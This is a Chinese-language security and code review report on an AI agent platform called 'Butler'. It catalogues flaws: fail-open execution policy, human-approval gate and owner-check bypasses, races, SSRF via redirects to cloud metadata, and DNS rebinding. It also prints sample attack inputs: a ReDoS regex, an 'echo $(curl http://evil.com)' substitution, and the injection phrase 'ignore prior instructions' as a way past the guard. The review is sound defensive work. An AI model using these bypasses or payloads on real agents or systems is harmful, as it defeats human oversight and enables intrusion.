# Butler 系统代码审查报告

**审查日期**: 2026-05-28
**审查范围**: butler/ 目录下所有核心模块
**审查方式**: 12 个并行 subagent 分组深度审查（初审 + 深度分析）

---

## 执行摘要

| 严重等级 | 初次审查 | 深度分析 | 合计 |
|---------|---------|---------|------|
| CRITICAL | 2 | 7 | 9 |
| HIGH | 14 | 18 | 32 |
| MEDIUM | 16 | 25 | 41 |
| LOW | 12 | 8 | 20 |

**整体评估**: 阻塞 — 9 个 CRITICAL 问题必须在合并前解决。

---

## CRITICAL 问题 (9个)

### 1. 执行策略默认允许绕过 (`execpolicy/engine.py:166-183`)

**文件**: `butler/execpolicy/engine.py`
**严重性**: CRITICAL

当 `execpolicy_enabled()` 为 `True` 但无规则匹配命令时，`evaluate_command()` 返回 `None`，调用者将 `None` 视为 "允许"。这意味着危险命令可以默认被允许。

```python
def evaluate_command(...) -> PolicyResult | None:
    if not execpolicy_enabled():
        return None
    for rule in load_policy_rules(workspace=workspace):
        if _matches_pattern(tokens, rule.pattern):
            return PolicyResult(...)
    return None  # ← 当启用但无匹配时返回 None = 允许
```

**影响**: 任何未在规则中明确禁止的命令都会被允许。
**修复**: 返回 `PolicyResult(decision=PolicyDecision.FORBIDDEN, ...)` 当启用但无规则匹配时。

---

### 2. TOCTOU 竞态条件 (`human_gate.py:149-169, 180-183`)

**文件**: `butler/human_gate.py`
**严重性**: CRITICAL

`_load_approved()` 和 `_save_approved()` 存在经典的时间-检查-时间-使用竞态条件。

```python
def mark_step_approved(session_key: str, workflow: str, step_id: str) -> None:
    keys = _load_approved(session_key)  # 竞态: 另一进程可能已修改
    keys.add(_approval_key(workflow, step_id))
    _save_approved(session_key, keys)   # 覆盖其他进程的更改
```

**修复**: 使用 `fcntl.flock()` 或原子文件重命名 (`tempfile.NamedTemporaryFile` + `os.rename()`)。

---

### 3. TOCTOU 竞态条件 (`audit.py:56-69`)

**文件**: `butler/runtime/audit.py`
**严重性**: CRITICAL

`try_acquire_lock()` 在检查 `path.exists()` 和写入锁文件之间存在竞态。

```python
if path.exists():                          # 竞态: 两进程看到相同时间戳
    ...
try:
    path.write_text(str(time.time()), ...)  # 两进程都写入; 后者胜出
```

**修复**: 使用 `os.open()` 配合 `O_CREAT | O_EXCL` 标志或 `fcntl.flock()`。

---

### 4. 权限规则 ReDoS 漏洞 (`permissions/rules.py:264-274`)

**文件**: `butler/permissions/rules.py`
**严重性**: CRITICAL

来自 `permissions.yaml` 的 `pattern_regex` 字段在运行时编译和执行，无超时或长度限制。恶意正则可能导致灾难性回溯。

```python
if re.search(str(pattern_re), text, re.I):  # 无超时!
    return PermissionDecision(allowed=False, ...)
```

**触发输入**: YAML 配置 `pattern_regex: "(a+)+$"` — 经典 ReDoS 模式。
**影响**: CPU 耗尽，进程挂起。
**修复**: 使用带超时的正则表达式库，或在加载时预验证正则模式。

---

### 5. Gate 过期时间戳验证绕过 (`human_gate.py:58-63`)

**文件**: `butler/human_gate.py`
**严重性**: CRITICAL

`_is_gate_expired()` 对 `created_at <= 0` 返回 `False`（永不过期）。攻击者可以修改 gate 文件设置 `created_at: -1` 来创建永久绕过。

```python
def _is_gate_expired(created_at: float) -> bool:
    if created_at <= 0:
        return False  # ← 负数时间戳永不过期
    return (time.time() - created_at) > _gate_ttl_seconds()
```

**修复**: 添加 `if created_at < 0: return True` 使无效时间戳立即过期。

---

### 6. Owner Gate 环境变量绕过 (`gateway/owner_gate.py:50-56`)

**文件**: `butler/gateway/owner_gate.py`
**严重性**: CRITICAL

任何有 shell 访问权限的人都可以通过设置环境变量绕过所有者检查。

```python
if os.getenv("BUTLER_PROJECT_CREATE_OPEN", "").strip().lower() in ("1", "true", "yes", "on"):
    return True  # ← 完全绕过所有者检查
```

**影响**: 如果 `BUTLER_PROJECT_CREATE_OPEN=1` 在生产环境被设置，任何用户都能获得所有者权限。
**修复**: 环境变量应在 dev/test 模式外默认禁用，且需要额外确认机制。

---

### 7. 非原子文件写入导致任务数据丢失 (`task_store.py:211-214`)

**文件**: `butler/runtime/task_store.py`
**严重性**: CRITICAL

`_write()` 直接使用 `path.write_text()` 而非原子重命名。进程崩溃或断电会导致 JSON 文件损坏或截断，任务记录永久丢失。

```python
def _write(task_id: str, record: dict[str, Any]) -> Path:
    path.write_text(json.dumps(record, ...), ...)  # 非原子
```

**修复**: 使用 `tempfile.NamedTemporaryFile` + `os.rename()` 实现原子写入。

---

### 8. 非原子读-修改-写导致 Push Queue 数据丢失 (`push_queue.py:41-54`)

**文件**: `butler/runtime/push_queue.py`
**严重性**: CRITICAL

`enqueue_failed_push()` 读取队列、修改、然后写回。并发调用会导致数据丢失。

```python
lines = path.read_text(encoding="utf-8").splitlines()  # 读取
# ... 修改 lines ...
path.write_text("\n".join(lines) + "\n", ...)  # 写入 — 并发时后者覆盖前者
```

**修复**: 使用 `fcntl.flock()` 在整个读-修改-写操作期间加锁。

---

### 9. 幂等性绕过导致消息重复处理 (`message_handler.py:505-509`)

**文件**: `butler/gateway/message_handler.py`
**严重性**: CRITICAL

当 `external_id` 未提供时，`inbound_id` 变为空字符串，幂等性检查被跳过。

```python
inbound_id = str(external_id or "").strip()
if inbound_id and inbound_id == chat_id_from_session_key(session_key):
    inbound_id = ""  # ← 空的 idempotency key 跳过检查
```

**影响**: 消息去重在平台未提供 message-level ID 时失效。
**修复**: 即使 `external_id` 为空也应生成唯一 key。

---

## HIGH 问题 (32个)

### 配置与设置模块

#### 10. API 密钥缺少验证 (`config.py:205-237`)

**文件**: `butler/config.py`
**严重性**: HIGH

`_load_env_providers()` 从环境变量读取 API 密钥但从不验证。格式错误或缺失的密钥被静默忽略。

**影响**: 配置错误的 API 密钥会在运行时导致难以理解的错误。

---

#### 11. 密钥文件权限设置存在竞态 (`config_secrets.py:108-112`)

**文件**: `butler/config_secrets.py`
**严重性**: HIGH

`write_provider_secret()` 先写入文件，然后设置权限。如果进程在写入和 chmod 之间崩溃，文件可能可读。

---

#### 12. 路径遍历验证缺失 (`config.py:56-57`)

**文件**: `butler/config.py`
**严重性**: HIGH

`BUTLER_PROJECTS_DIR` 只验证存在性，不验证遍历模式。恶意的 `BUTLER_PROJECTS_DIR` 值可能导致文件被写入/读取到预期目录之外。

---

#### 13. 配置文件类型强制转换无验证 (`config.py:107-116`)

**文件**: `butler/config.py`
**严重性**: HIGH

`ModelConfig.from_dict()` 直接存储值而不验证类型。如果 YAML 包含 `temperature: "0.7"`（字符串而非浮点数），会导致后续 `max()` 比较失败。

```python
temperature=data.get("temperature"),  # 无类型验证
```

**影响**: 拒绝服务 — 类型不匹配导致比较操作失败。

---

#### 14. 整数边界检查缺失 (`config_service.py:132-136`)

**文件**: `butler/config_service.py`
**严重性**: HIGH

整数被解析但结果被丢弃 — 无边界检查。`BUTLER_WEB_FETCH_MAX_BYTES` 可以设置为极大值导致内存耗尽；`BUTLER_WEB_FETCH_TIMEOUT` 设置为 0 可能导致超时问题。

---

#### 15. 秘密文件 chmod 失败被静默忽略 (`config_secrets.py:31-42`)

**文件**: `butler/config_secrets.py`
**严重性**: HIGH

`_ensure_private_mode()` 在 DEBUG 级别静默吞没所有异常。如果 chmod 失败，秘密文件可能以全局可读权限存储。

```python
except OSError as exc:
    logger.debug("secrets chmod skipped: %s", exc)  # 静默
```

---

#### 16. Skill Bundle 隔离路径遍历 (`registry/skill_install.py:47-48`)

**文件**: `butler/registry/skill_install.py`
**严重性**: HIGH

路径检查只捕获字面的 `..`，可被编码路径或替代表示绕过。

```python
safe = rel.replace("\\", "/").lstrip("/")
if ".." in safe.split("/"):  # 只检测字面 ".."
```

---

#### 17. 秘密写入非原子 (`config_secrets.py:94-113`)

**文件**: `butler/config_secrets.py`
**严重性**: MEDIUM → HIGH（深度分析重分类）

`write_provider_secret()` 执行非原子写入。如果两个并发调用写入不同的 provider，secrets.yaml 可能被损坏。

---

#### 18. 会话密钥验证弱允许注入 (`session/keys.py:34`)

**文件**: `butler/session/keys.py`
**严重性**: HIGH

`project_from_session_key()` 只用 `:` 分割，无验证。格式错误的会话密钥可能通过会话路由注入内容。

---

#### 19. 启发式注入检测易被绕过 (`memory/injection_guard.py:42-56`)

**文件**: `butler/memory/injection_guard.py`
**严重性**: HIGH

触发器列表只有 10 个，攻击者可以用变体（如 `"ignore prior instructions"` 替代 `"ignore previous"`）完全绕过检测。

---

#### 20. 缺少 glob 元字符转义 (`permissions/rules.py:65-71`)

**文件**: `butler/permissions/rules.py`
**严重性**: HIGH

`_match_glob()` 只支持尾部 `*`。如果模式包含 `.` 或 `+` 等正则特殊字符，它们不会被转义。

```python
if pat.endswith("*"):
    return value.startswith(pat[:-1])  # . 不转义
return value == pat
```

**影响**: 白名单绕过 — `config.*` 可能匹配 `configxyz`。

---

#### 21. 异常时_fail-open (`permissions/rules.py:98-100`)

**文件**: `butler/permissions/rules.py`
**严重性**: HIGH

第二个异常处理捕获所有异常并返回 `False`（不在工作区外），这会让路径被视为在workspace内，绕过 external_directory 规则。

---

### 运行时与委托模块

#### 22. Push Queue 文件写入竞态 (`push_queue.py:29-55, 88-139`)

**文件**: `butler/runtime/push_queue.py`
**严重性**: HIGH（已在 CRITICAL #8 中列出）

---

#### 23. 守护线程无优雅关闭 (`runner.py:70-77`)

**文件**: `butler/runtime/runner.py`
**严重性**: HIGH

`threading.Thread(..., daemon=True)` 意味着主进程退出时线程被强制终止。可能将任务记录永久留在 "running" 状态。

---

#### 24. 循环内导入 (`subagent_permissions.py:70-76`)

**文件**: `butler/delegate/subagent_permissions.py`
**严重性**: HIGH

`is_mcp_registered_name` 的导入在工具过滤循环内部，导入失败会被静默忽略。如果模块不存在，所有工具都被静默过滤掉。

---

#### 25. 异常被吞没 (`service.py:146-156, 172-179`)

**文件**: `butler/runtime/service.py`
**严重性**: HIGH

两个 try/except 块在 DEBUG 级别静默吞没所有异常，在生产环境中掩盖真实故障。

---

#### 26. `_run_with_retry` 原地改变 `task` (`task_orchestrator.py:515`)

**文件**: `butler/task_orchestrator.py`
**严重性**: HIGH

`pool.interpolate()` 直接改变 `node.config.task`，如果在重试期间再次调用，可能导致变量替换偏移。

---

#### 27. `_safe_json_loads` 对非字典 JSON 失效 (`tool_guardrails.py:144-152`)

**文件**: `butler/tool_guardrails.py`
**严重性**: HIGH

对于返回 **列表** 类型的 JSON（如 `git_log` 返回的提交数组），`isinstance(data, dict)` 为 `False`，函数返回 `(False, "")` — 即使 `exit_code != 0` 也被认为不是失败。

```python
data = _safe_json_loads(result)
if isinstance(data, dict):  # 列表类型跳过所有检查
    ...
return False, ""  # exit_code 被忽略
```

---

#### 28. Subagent 默认拒绝列表过小 (`subagent_permissions.py:13-19`)

**文件**: `butler/delegate/subagent_permissions.py`
**严重性**: HIGH

默认只有 5 个工具被拒绝。`terminal`、`bash`、`write_file`、`read_file` 等危险工具默认可用，除非 `permissions.yaml` 明确禁止。

```python
_DEFAULT_SUBAGENT_DENY = frozenset({
    "delegate_task",
    "run_workflow",
    "run_runtime_job",
    "session_todos_list",
    "session_todos_write",
})
```

---

### 传输与工具模块

#### 29. 文件描述符泄漏 (`builtin_impl.py:143-149`)

**文件**: `butler/tools/builtin_impl.py`
**严重性**: HIGH

当 `_validate_regular_file_stat()` 返回错误时，函数返回而不调用 `os.close(fd)`。文件描述符被泄漏。

```python
if validation_error:
    return b"", p, None, validation_error  # FD 在此处泄漏!
```

---

#### 30. UTF-8 字符处理不完整 (`memory_context_scrubber.py:21-35`)

**文件**: `butler/transport/memory_context_scrubber.py`
**严重性**: HIGH

`_hold_index()` 返回字节索引而非字符索引。在多字节 UTF-8 字符上，`buf[hold:]` 会在错误边界切片，导致输出损坏。

```python
def _hold_index(buf: str) -> int:
    lower = buf.lower()
    for plen in range(len(_TAG) - 1, 0, -1):
        partial = _TAG[:plen]
        if lower.endswith(partial):
            return len(buf) - plen  # ← 字节索引，非字符索引
```

---

#### 31. 硬链接检查中的 TOCTOU (`builtin_impl.py:185-196`)

**文件**: `butler/tools/builtin_impl.py`
**严重性**: HIGH

在 `expected_stat = p.stat()` 和硬链接检查之间，攻击者可以创建硬链接绕过检查。

---

#### 32. 注入绕过文件无加密认证 (`human_gate.py:259-288`)

**文件**: `butler/human_gate.py`
**严重性**: HIGH

`grant_injection_bypass()` 写入的文件可被有文件系统访问权限的攻击者修改。无签名/hmac 防止篡改。

---

### 核心编排模块

#### 33. `execute_graph` 中可变 dataclass 字段 (`task_orchestrator.py:378-394`)

**文件**: `butler/task_orchestrator.py`
**严重性**: HIGH

代码就地改变 `node.config.context` 而非创建新对象。同一 `TaskNode` 在多次图执行中被重用时，context 会累积，导致提示腐化。

```python
node.config.context = (
    (node.config.context or "") + "\n\n" + "\n".join(dep_contexts)
)
```

---

#### 34. `_topological_sort` O(n²) 性能 (`task_orchestrator.py:654`)

**文件**: `butler/task_orchestrator.py`
**严重性**: HIGH

使用 `list.pop(0)` 导致每次 pop 是 O(n)，总体复杂度 O(n²)。用 `deque` 可以是 O(n log n) 或 O(n)。

```python
while queue:
    nid = queue.pop(0)  # O(n) 从列表前端 pop
```

---

### 安全模块

#### 35. 非 WeChat 平台绕过所有者验证 (`gateway/owner_gate.py:58-60`)

**文件**: `butler/gateway/owner_gate.py`
**严重性**: HIGH

任何非 `wechat`/`weixin` 的平台（如 API client、test harness）完全绕过所有者验证。

```python
if plat not in ("wechat", "weixin"):
    return True  # ← 绕过
```

---

#### 36. 空白名单绕过所有者验证 (`gateway/owner_gate.py:62-64`)

**文件**: `butler/gateway/owner_gate.py`
**严重性**: HIGH

如果所有者空白名单为空，任何人都能执行所有者操作。

```python
allowed = owner_wechat_ids()
if not allowed:
    return True  # ← 绕过
```

---

#### 37. SSRF 通过重定向绕过 (`download_tools.py:136`, `web_fetch.py:102`)

**文件**: `butler/tools/download_tools.py`, `butler/tools/web_fetch.py`
**严重性**: HIGH

`urlopen()` 自动跟随重定向，但目标 URL 从不重新验证。恶意服务器可以将 `https://allowed-host.com/file` 重定向到 `https://169.254.169.254/latest/meta-data/`（AWS 元数据服务）。

```python
with urlopen(req, timeout=timeout_sec) as resp:  # 自动跟随重定向
    # resp.url 是最终 URL，但无重新验证
```

**修复**: 实现重定向拒绝处理器，或在连接时重新验证最终 URL。

---

#### 38. DNS 重绑定攻击 (`registry/url_safety.py:63-69`)

**文件**: `butler/registry/url_safety.py`
**严重性**: HIGH

DNS 在验证时解析一次，在连接时再次解析。攻击者可以在验证后将 DNS 指向内部 IP。

```python
ok, err = _resolve_public_ip(host)  # 验证时解析 → 公网 IP
# 攻击者改变 DNS...
httpx.get(url)  # 连接时再次解析 → 内部 IP
```

---

#### 39. JSON 解析失败静默忽略 (`post_session.py:122-130`)

**文件**: `butler/session/post_session.py`
**严重性**: HIGH

格式错误的 JSON 被静默丢弃，无日志记录。攻击者可以通过在 LLM 响应中注入格式错误的 JSON 来绕过内存/技能更新检测。

```python
def _parse_json_from_response(text: str) -> dict | None:
    ...
    except json.JSONDecodeError:
        return None  # 静默失败 — 无日志!
```

---

#### 40. 非原子 injection bypass (`human_gate.py:259-288`)

**文件**: `butler/human_gate.py`
**严重性**: HIGH

`grant_injection_bypass()` 写入时无原子重命名。`consume_injection_bypass()` 读取过期时间后删除前有 TOCTOU，可能导致双消费竞态。

---

#### 41. 异步 fire-and-forget 无生命周期管理 (`delegate_job.py:101-104`)

**文件**: `butler/runtime/delegate_job.py`
**严重性**: HIGH

`asyncio.run_coroutine_threadsafe()` 提交协程但不等待完成。如果主线程在协程完成前退出，推送通知可能永远不发送。

```python
asyncio.run_coroutine_threadsafe(_send(), push_target.loop)
return True  # ← 误导性的成功指示
```

---

#### 42. `_memory_by_tenant` 无限增长 (`orchestrator.py:134-138`)

**文件**: `butler/orchestrator.py`
**严重性**: MEDIUM → HIGH（深度分析重分类）

`_memory_by_tenant` 字典在首次访问时填充每个租户但从不驱逐。如果许多租户连接，内存无限增长。

---

## MEDIUM 问题 (41个)

### 配置与设置模块

#### 43. 布尔值强制转换不一致 (`config_service.py:130-131`)

**文件**: `butler/config_service.py`
**严重性**: MEDIUM

只有小写变体被接受。`"TRUE"`、`"YES"` 被拒绝。环境变量通常是大小写混合的。

---

#### 44. 启动时不验证必需环境变量 (`config.py:21`)

**文件**: `butler/config.py`
**严重性**: MEDIUM

`load_dotenv()` 在模块导入时调用，但不验证必需的环境变量。

---

### 运行时模块

#### 45. 在已运行事件循环中调用 asyncio.run() (`delegate_job.py:92-104`)

**文件**: `butler/runtime/delegate_job.py`
**严重性**: MEDIUM

`asyncio.run_coroutine_threadsafe()` 传给 `asyncio.run()`，但如果 `push_target.loop` 已经在运行事件循环，会在同一线程创建新事件循环。

---

#### 46. 多线程上下文中的阻塞 time.sleep() (`notify.py:77-95`)

**文件**: `butler/runtime/notify.py`
**严重性**: MEDIUM

`_wait_push_cooldown()` 使用 `time.sleep()` 阻塞整个线程。

---

#### 47. ContextVar 重置顺序问题 (`execution_context.py:82-85`)

**文件**: `butler/execution_context.py`
**严重性**: MEDIUM

`_current_session_key` 在 `_current_orchestrator` 之前重置。如果重置期间发生异常，orchestrator 可能处于不一致状态。

---

#### 48. 事件循环线程安全未验证 (`delegate_job.py:89-104`)

**文件**: `butler/runtime/delegate_job.py`
**严重性**: MEDIUM

代码假设 `push_target.loop` 是当前线程或不会在协程完成前退出的线程。如果不在正确的线程上，会抛出 `RuntimeError`。

---

#### 49. `_send()` 中的异常静默丢失 (`delegate_job.py:92-98`)

**文件**: `butler/runtime/delegate_job.py`
**严重性**: MEDIUM

如果 `deliver_completion_push()` 在 `_send()` 中抛出异常，异常被事件循环的异常处理器捕获并打印到 stderr。无日志记录。

---

#### 50. `finally` 块中 `release_delegate_slot` 吞没所有异常 (`delegate_job.py:252-258`)

**文件**: `butler/runtime/delegate_job.py`
**严重性**: MEDIUM

如果 `release_delegate_slot()` 抛出异常（如信号量已释放），它被捕获且仅在 DEBUG 级别记录。这可能导致信号量泄漏。

---

### 传输模块

#### 51. Guardrail 失败静默阻止安全功能 (`tool_guardrails.py:192-193, 236-237, 360-361`)

**文件**: `butler/tool_guardrails.py`
**严重性**: MEDIUM

Guardrail 控制器在任何异常时静默跳过操作。意味着 doom-loop 检测被静默禁用。

---

#### 52. Web Fetch 中相同 SSRF 问题 (`web_fetch.py:101-102`)

**文件**: `butler/tools/web_fetch.py`
**严重性**: MEDIUM

无检查 `resp.url`（重定向后的最终 URL）是否仍然安全。

---

#### 53. `strip_think_blocks` 中 ReDoS 潜在风险 (`content_sanitize.py:45-52`)

**文件**: `butler/transport/content_sanitize.py`
**严重性**: MEDIUM

正则表达式中的嵌套否定可能导致病态回溯。

---

#### 54. `_pipe_mode_enabled()` 允许 shell=True 执行 (`path_safety.py:187-204`)

**文件**: `butler/tools/path_safety.py`
**严重性**: MEDIUM

当 `BUTLER_TERMINAL_PIPE=1` 时，`shell=True` 在 subprocess 调用中执行，绕过 shlex.split 验证。

---

#### 55. `_doom_soft_nudged` 集合无限增长 (`tool_guardrails.py:200, 251-253`)

**文件**: `butler/tool_guardrails.py`
**严重性**: MEDIUM

`_doom_soft_nudged` 是记录软提示签名的集合。它只在 `reset_for_turn()` 时清除，但如果 `reset_for_turn()` 未被调用，集合无限增长。

---

#### 56. `append_guidance` 改变输入结果参数 (`tool_guardrails.py:461-467`)

**文件**: `butler/tool_guardrails.py`
**严重性**: MEDIUM

对于非字典 JSON（列表或标量），函数将引导文本追加到现有结果字符串。如果调用代码期望有效 JSON，这会腐化输出。

---

### 计划/报告模块

#### 57. MCP 禁用时提前返回无用户反馈 (`deferred.py:93-94`)

**文件**: `butler/mcp/deferred.py`
**严重性**: MEDIUM

当 `mcp_enabled()` 返回 `False` 时，函数静默返回空列表。调用者无法区分 "禁用" 和 "无结果"。

---

#### 58. `limit=0` 返回最后一个元素而非空列表 (`telemetry.py:50`)

**文件**: `butler/hooks/telemetry.py`
**严重性**: MEDIUM

`max(1, int(0))` 变为 1，所以 `rows[-1:]` 返回包含最新记录的列表。

---

#### 59. `parse_structured_output` 静默返回最后一个候选无模式验证反馈 (`generator.py:171-174`)

**文件**: `butler/report/generator.py`
**严重性**: MEDIUM

当 `field_names` 指定但最佳候选缺乏那些字段时，函数返回包含缺失键的字典。

---

#### 60. 模式匹配是精确 token 而非子序列 (`execpolicy/engine.py:97-107`)

**文件**: `butler/execpolicy/engine.py`
**严重性**: MEDIUM

glob `*` 被当作字面 `*` 而非通配符。规则 `["rm", "-rf", "*"]` 期望匹配任何文件，但实际上字面匹配 `*`。

---

#### 61. shell 注入通过 tokenization (`execpolicy/engine.py:46-53`)

**文件**: `butler/execpolicy/engine.py`
**严重性**: MEDIUM

`shlex.split()` 使用 `posix=True`，命令替换如 `echo $(curl http://evil.com)` 不会被展开为 literal text，可能绕过模式匹配。

---

### 安全模块

#### 62. 秘密文件权限检查但未强制执行 (`config_secrets.py:31-42`)

**文件**: `butler/config_secrets.py`
**严重性**: MEDIUM

错误被静默忽略（`except OSError as exc: logger.debug(...)`）；秘密可能以宽容模式存储。

---

#### 63. 文档转换错误泄漏文件路径 (`inbound_media.py:88-93`)

**文件**: `butler/gateway/inbound_media.py`
**严重性**: MEDIUM

异常对象直接暴露在面向用户的文本中，揭示内部路径、变量名、库内部结构。

---

#### 64. SSRF 保护有时序侧信道 (`url_safety.py:62-69`)

**文件**: `butler/registry/url_safety.py`
**严重性**: MEDIUM

DNS 解析时序可能泄漏内部网络拓扑信息。

---

#### 65. 网关端点无速率限制 (`message_handler.py` 整个文件)

**文件**: `butler/gateway/message_handler.py`
**严重性**: MEDIUM

无按用户或按 IP 的速率限制；容易受到 DoS 和资源耗尽攻击。

---

#### 66. Profile Store 注入检查不完整 (`butler_memory.py:18-25`)

**文件**: `butler/memory/butler_memory.py`
**严重性**: MEDIUM

缺少许多常见提示注入模式，如 base64 编码命令、unicode 同形字、XML 注入、JSON 注入等。

---

#### 67. LIKE 查询特殊字符未转义 (`butler_memory.py:297`)

**文件**: `butler/memory/butler_memory.py`
**严重性**: MEDIUM

FTS5 短语转义正确，但回退的 LIKE 查询对 `%`、`_`、`\` 等特殊字符无转义。

---

#### 68. 命令正则表达式未锚定 (`rules.py:326-331`)

**文件**: `butler/permissions/rules.py`
**严重性**: MEDIUM

命令正则模式未锚定。像 `rm.*rf` 这样的模式会匹配 `echo rm something rf.txt`。

---

#### 69. 工具名称精确匹配无规范化 (`rules.py:246`)

**文件**: `butler/permissions/rules.py`
**严重性**: MEDIUM

白名单规范化了工具名称，但评估时不做规范化。如果工具名称格式不同，规则可能不匹配。

---

#### 70. 工具名称比较不完整 (`builtin_impl.py:271-296`)

**文件**: `butler/tools/builtin_impl.py`
**严重性**: MEDIUM

`_validate_existing_target_unchanged` 中 `os.fstat()` 后关闭 FD 是正确的，但 `O_NOFOLLOW` 标志在某些系统上可能不受支持。

---

### 其他模块

#### 71. 大文件大小 - `main.py` 超过推荐 800 行限制

**文件**: `butler/main.py` (1340 行)
**严重性**: MEDIUM

文件比 800 行项目指南大 67%。

---

#### 72. `_handle_slash_command` 对未处理命令返回 `None` (`main.py:141-147`)

**文件**: `butler/main.py`
**严重性**: MEDIUM

对未识别命令返回 `None`（隐式），依赖隐式布尔强制转换而非显式 sentinel。

---

#### 73. 无界字符串切片无限制检查 (`task_orchestrator.py:636`)

**文件**: `butler/task_orchestrator.py`
**严重性**: MEDIUM

在访问 `.strip()` 之前，不保证 `dep_result.response` 或 `dep_result.error` 不为 `None`。

---

#### 74. `yaml.safe_load` 使用时无限制加载器 (`agents_md.py:35`)

**文件**: `butler/agents_md.py`
**严重性**: MEDIUM

YAML 从用户控制的项目文件解析。如果恶意项目文件包含特殊制作的 YAML，可能导致 DoS。

---

#### 75. `resolve_human_gate_message` 中检查-然后-行动竞态 (`human_gate.py:297-316`)

**文件**: `butler/human_gate.py`
**严重性**: MEDIUM

在 `_load_pending()` 和 `_save_pending()` 之间，另一个消息处理器可以调用 `_save_pending()`，覆盖当前 gate 状态。

---

#### 76. 工具名比较大小写敏感性 (`rules.py:246`)

**文件**: `butler/permissions/rules.py`
**严重性**: MEDIUM

`"ReadFile"` vs `"read_file"` 不匹配。允许列表规范化了名称，但评估时没有。

---

#### 77. `_sync_turn_lock` 持有期间调用外部提供程序 (`lifecycle.py:907-933`)

**文件**: `butler/session/lifecycle.py`
**严重性**: MEDIUM

`_SYNC_TURN_LOCK` 在调用外部 `provider.sync_turn()` 时被持有。如果提供者实现做 I/O 或尝试获取另一个锁，会导致死锁或严重锁争用。

---

#### 78. TOCTOU 连接检查 (`mcp/manager.py:148-175`)

**文件**: `butler/mcp/manager.py`
**严重性**: MEDIUM

`handle.status.connected` 在无锁情况下检查，然后 handle 在连接可能已断开的其他地方使用。

---

#### 79. 超时堆叠 (`mcp/manager.py:218`)

**文件**: `butler/mcp/manager.py`
**严重性**: MEDIUM

`timeout + 10.0` 包装内部的 `asyncio.wait_for(call_stdio_tool(...), timeout=timeout)`。如果内部等待超时，外部的 `run_mcp_async` 已经消耗了 `timeout + 10.0` 秒。

---

#### 80. 重定向链 SSRF (`skill_sources/url.py:61-64`)

**文件**: `butler/registry/skill_sources/url.py`
**严重性**: MEDIUM

只验证一个重定向跳。如果 `loc` 本身重定向到内部 IP，第二个跳不会验证。

```python
if loc and is_safe_url(loc):
    resp = httpx.get(loc, timeout=30.0, follow_redirects=False)  # 第二跳无验证
```

---

#### 81. `_matches_pattern` glob 不支持中间 `*` (`execpolicy/engine.py:97-107`)

**文件**: `butler/execpolicy/engine.py`
**严重性**: MEDIUM

模式 `["rm", "-rf", "*"]` 会精确匹配字面 `*`，但用户期望 `*` 表示 "任何文件"。

---

#### 82. `grant_always` 无去重限制 (`permissions/approvals.py:145-175`)

**文件**: `butler/permissions/approvals.py`
**严重性**: MEDIUM

去重只移除精确重复项。如果用户循环调用 `grant_always()` 并且每次模式略有不同，条目无限累积。

---

#### 83. `_parse_frontmatter` 对前置空行失效 (`agents_md.py:13`)

**文件**: `butler/agents_md.py`
**严重性**: MEDIUM

正则表达式要求正文紧跟在 `\n---\s*\n` 之后。如果在结束 `---` 和实际内容开始之间有空行，正文内容会丢失。

```python
_FRONTMATTER_RE = re.compile(r"^---\s*\n(.*?)\n---\s*\n(.*)$", re.DOTALL)
# 如果内容以空行开始，(.*)$ 匹配空字符串
```

---

#### 84. `_run_with_retry` 中插值突变 (`task_orchestrator.py:515`)

**文件**: `butler/task_orchestrator.py`
**严重性**: MEDIUM

`pool.interpolate()` 直接改变 `node.config.task`。在重试期间再次调用时，已经插值的文本会再次被插值，可能导致变量替换偏移。

---

#### 85. `_atomic_write_text` TOCTOU (`builtin_impl.py:185-216`)

**文件**: `butler/tools/builtin_impl.py`
**严重性**: MEDIUM

硬链接检查（line 185）和 `os.open()`（line 216）之间存在时间窗口，攻击者可以在检查和使用之间创建硬链接。

---

#### 86. `_in_block` 刷新时部分推理块泄漏 (`think_scrubber.py:212-215`)

**文件**: `butler/transport/think_scrubber.py`
**严重性**: LOW → MEDIUM（深度分析重分类）

刷新时如果不在 block 中，保存的 partial tag 被发出，可能泄漏部分标签。

---

#### 87. 描述和权限模式截断无省略号 (`agents_md.py:71, 75`)

**文件**: `butler/agents_md.py`
**严重性**: LOW → MEDIUM（深度分析重分类）

字符串在 500 和 32 字符处被静默截断。添加了警告也无，省略号也不加。

---

#### 88. `_safe_json_loads` 结果处理不一致 (`tool_guardrails.py:161-164`)

**文件**: `butler/tool_guardrails.py`
**严重性**: MEDIUM

`"error"`（带引号）vs `"Error"`（无引号）在不同位置检查，启发式方法不一致，可能导致假阴性或假阳性。

---

#### 89. 确认响应验证区分大小写 (`human_gate.py:291-294`)

**文件**: `butler/human_gate.py`
**严重性**: LOW → MEDIUM（深度分析重分类）

只有精确的大小写敏感匹配有效。用户必须准确输入 `"确认"` 或 `"ok"`。

---

#### 90. 验证 OpenAI 序列异常被吞没 (`inbound_validate.py:18-23`)

**文件**: `butler/gateway/inbound_validate.py`
**严重性**: MEDIUM

如果 `validate_openai_sequence` 抛出任何异常，验证被完全绕过并返回 `None`（意味着 "有效"）。

```python
except Exception:
    return None  # ← 任何异常导致静默通过
```

---

## LOW 问题 (20个)

### 1. 秘密文件读取静默失败 (`config_secrets.py:54-55`)

如果秘密文件损坏，会被静默忽略。用户可能丢失凭据而不知。

---

### 2. `load_dotenv()` 顺序风险 (`config.py:21`)

`load_dotenv()` 在模块导入时调用。如果其他模块在 config 之前导入并依赖环境变量，可能获得未填充的值。

---

### 3. 任务陈旧检测使用不可靠时间方法 (`task_store.py:48-57`)

`is_task_stale()` 使用 `datetime.now(timezone.utc)`，但存储的 `updated_at` 可能没有时区信息。

---

### 4. 魔法数字未提取为常量 (`task_store.py:57, 122, 155`)

`60`、`500`、`3000` 等魔法数字硬编码而无命名常量。

---

### 5. human_gate.py 中重复的 hashlib 计算 (`human_gate.py:107, 115, 254-256`)

对相同 session_key 计算了 3 次 `hashlib.sha256(...).hexdigest()[:16]`，无缓存。

---

### 6. delegate_job.py 中裸 except 子句 (`delegate_job.py:241`)

裸 `except Exception` 太宽泛，会捕获 `KeyboardInterrupt`、`SystemExit` 和 `asyncio.CancelledError`。

---

### 7. 审计跟踪只存储 arg 键而非删除的参数 (`registry.py:610`)

只存储参数键，不存储删除后的值。取证分析价值降低。

---

### 8. `_strip_orphan_close_tags` 线性复杂度 (`think_scrubber.py:356-386`)

每个字符位置进行最多 5 次子字符串比较。可以用编译的正则表达式替代。

---

### 9. 默认 Butler 名称硬编码 (`config.py:183`)

`butler_name: str = "莎丽"` 应可通过环境变量或配置文件配置。

---

### 10. 每次调用都读取会话同步环境 (`lifecycle.py:31-40`)

无缓存；每次调用重复读取环境。

---

### 11. Skill 源网络调用无超时 (`skill_sources.py`)

